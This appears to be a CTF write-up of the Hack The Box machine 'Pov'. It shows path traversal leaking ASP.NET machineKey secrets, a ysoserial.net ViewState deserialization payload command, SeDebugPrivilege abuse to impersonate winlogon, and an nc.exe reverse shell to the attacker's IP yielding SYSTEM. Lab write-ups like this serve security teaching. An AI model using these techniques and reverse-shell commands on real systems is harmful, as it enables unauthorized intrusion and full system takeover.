### Web Enumeration

![port80](/assets/img/posts/pov/port80.png)

The **Contact Us** section mentioned two hostnames: `pov.htb` and `dev.pov.htb`. I added both to `/etc/hosts`.

```bash
tr3m0x@ubuntu:~/htb/windows/Pov$ echo "10.129.67.168 pov.htb dev.pov.htb" | sudo tee -a /etc/hosts
```

The main `pov.htb` site was mostly static. The contact form did not expose useful behavior, so I moved to the development virtual host.

![dev.pov.htb](/assets/img/posts/pov/dev_pov_htb.png)

The `dev.pov.htb` application had a **Download** button. File download features are worth testing because they often pass a filename or path to the backend. I intercepted the request in Burp Suite.

![burp](/assets/img/posts/pov/burp.png)

The request included a file path parameter. I tested for path traversal by requesting `....//web.config`.

![burp2](/assets/img/posts/pov/burp2.png)

The server returned the application's `web.config`, confirming arbitrary file read through path traversal.

## Exploitation

### ASP.NET ViewState Background

The downloaded `web.config` exposed a `machineKey` configuration:

```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
  <system.webServer>
    <httpErrors>
      <remove statusCode="403" subStatusCode="-1" />
      <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
    </httpErrors>
    <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
  </system.webServer>
</configuration>
```

ASP.NET Web Forms stores page state in the `__VIEWSTATE` field. That value is serialized data sent to the client and submitted back to the server. ASP.NET protects it with a message authentication code based on the application's `machineKey`.

Because the path traversal disclosed both the `validationKey` and `decryptionKey`, I could generate a valid malicious ViewState payload. For .NET 4.5 targets, the payload must be generated with the correct validation and decryption settings, and it also needs to match the target page path.

### Generating a ViewState Payload

I used [`ysoserial.net`](https://github.com/pwntester/ysoserial.net) to generate the payload. I recommend using a release build instead of cloning and compiling it during the box.

```bash
tr3m0x@ubuntu:~/htb/windows/Pov$ wine ~/tools/ysoserial/Release/ysoserial.exe \
    -p ViewState \
    -g TextFormattingRunProperties \
    -c "powershell -e <BASE64_REVERSE_SHELL>" \
    --path="/portfolio" \
    --decryptionalg="AES" \
    --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
    --validationalg="SHA1" \
    --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
    2>/dev/null
5%2FhXNwI1cJSUymWMD7UEZsAq7itJPfNKJgzfD4xWSTlhB9a9nzGK1BK7Jea2rdk06mguYCYJi5bD8ZmWLNv8Z4rGAivQYASu79cNUgKxYBqHra<SNIP>
```

After generating the payload, I replaced the request's `__VIEWSTATE` value with the ysoserial output and submitted the POST request.

## Privilege Escalation

### SeDebugPrivilege

I checked the full token in the Evil-WinRM session and found an important difference from the earlier `Invoke-Command` output.

```powershell
*Evil-WinRM* PS C:\Users\alaading\Documents> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

At first, this looked inconsistent because `SeDebugPrivilege` was disabled in the `Invoke-Command` session but enabled in Evil-WinRM. The key detail is that `whoami /all` reports the privileges in the current process token. A user can have a privilege assigned, while a specific logon session or process token may show it as disabled.

Here, the two sessions had different integrity levels:

- `Invoke-Command` returned a **Medium Mandatory Level** token.
- `evil-winrm` returned a **High Mandatory Level** token.

`SeDebugPrivilege` allows a process to debug and interact with processes owned by other users, including SYSTEM processes. That makes it a strong privilege escalation path.

### SYSTEM Process Impersonation

I used [`psgetsystem`](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1), which abuses `SeDebugPrivilege` by spawning a process from a SYSTEM-owned parent process. First, I listed processes and chose `winlogon` as the parent target.

```powershell
*Evil-WinRM* PS C:\Users\alaading\Documents> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    945      22     5348      43572       2.42    648   0 lsass
    541      12     4756       9364       1.00    628   0 services
   1679       0      192        144       8.47      4   0 System
    255      12     2656      16316       0.23    556   1 winlogon
    991      31   131540     157144       4.00    752   0 wsmprovhost
```

Before launching a shell, I tested execution with an ICMP callback.

```powershell
*Evil-WinRM* PS C:\Users\alaading\Documents> ImpersonateFromParentPid -ppid 556 -command "C:\Windows\System32\cmd.exe" -cmdargs "/c ping -n 5 10.10.15.5"
```

The ping reached my tun interface, confirming code execution from the impersonated process.

```bash
tr3m0x@ubuntu:~/htb/windows/Pov$ sudo tcpdump icmp -i tun0

18:26:19.537394 IP ubuntu > pov.htb: ICMP echo reply, id 1, seq 6, length 40

18:26:25.308689 IP ubuntu > pov.htb: ICMP echo reply, id 1, seq 8, length 40
```

### SYSTEM Shell

I uploaded `nc.exe` and used the same impersonation technique to start a reverse shell.

```powershell
*Evil-WinRM* PS C:\Users\alaading\Documents> ImpersonateFromParentPid -ppid 556 -command "C:\Windows\System32\cmd.exe" -cmdargs "/c C:\Users\alaading\Documents\nc.exe 10.10.15.5 9001 -e powershell"
```

The callback landed as SYSTEM.

```bash
tr3m0x@ubuntu:~/htb/windows/Pov$ listen 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.67.168 49806
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
```

And that completed the machine.
